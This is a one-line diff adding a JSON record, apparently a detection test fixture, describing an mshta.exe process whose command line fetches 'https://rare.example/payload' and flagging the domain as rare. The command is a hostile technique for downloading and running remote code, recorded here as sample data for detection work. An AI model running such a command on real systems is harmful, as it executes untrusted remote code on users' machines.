@@ -1,0 +1,1 @@
+{"proc_name": "mshta.exe", "command_line": "mshta.exe https://rare.example/payload", "rare_domain": true}
